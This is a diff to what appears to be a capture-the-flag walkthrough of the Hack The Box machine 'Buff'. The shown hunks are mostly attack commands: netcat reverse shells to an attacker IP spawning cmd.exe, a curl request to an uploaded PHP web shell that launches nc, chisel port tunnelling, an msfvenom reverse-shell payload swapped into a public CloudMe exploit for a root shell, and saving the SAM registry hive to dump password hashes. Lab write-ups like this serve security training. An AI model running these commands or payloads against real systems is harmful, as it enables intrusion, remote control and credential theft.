@@ -87,13 +87,16 @@ rlwrap nc -nlvp 42424 # blocking. will open cmd.exe for a proper reverse shell i
 ```sh
 # copy netcat to Buff.
 copy \\10.10.14.69\\share\\nc.exe .
-copy \\10.10.14.69\\share\\chisel.exe . # *.exe
+copy \\10.10.14.69\\share\\chisel.exe .
 
 # let's get a proper shell!
 nc.exe 10.10.14.69 42424 -e cmd.exe
 # alternatives: chisel.exe, plink.exe
 # you don't even need to download netcat:
 \\10.10.14.69\\share\\nc.exe 10.10.14.69 42424 -e cmd.exe # better!
+
+# or from kali:
+curl 'http://buff:8080/upload/kamehameha.php?telepathy=nc.exe%2010.10.14.69%2042424%20-e%20cmd'
 ```
 
 > on Buff via proper reverse shell
@@ -162,10 +165,27 @@ grep -i listening netstat.log # careful, only for english versions!
 chisel.exe client 10.10.14.69:12345 R:8888:127.0.0.1:8888
 ```
 
-# EXPLOIT IT
+iCloudme 1.11.2 is vulnerable to this exploit:
 
-# DUMP HASHES
+* https://www.exploit-db.com/exploits/48389
 
+> on Kali
+```sh
+nc -lnvp 3667 # for reverse shell.
+
+# we don't want to launch the calculator so let's update the payload:
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.69 LPORT=3667 -b '\x00\x0A\x0D' -f python -v payload > payload
+cp 48389.py 48389_new-payload.py
+
+# replace the payload in our new copy.
+
+# run it:
+python2 48389_new-payload.py
+# now we have a root shell!
+```
+
+
+> for fun: dump hashes as admin
 ```sh
 # as windows admin:
 reg.exe save hklm\sam sam.reg
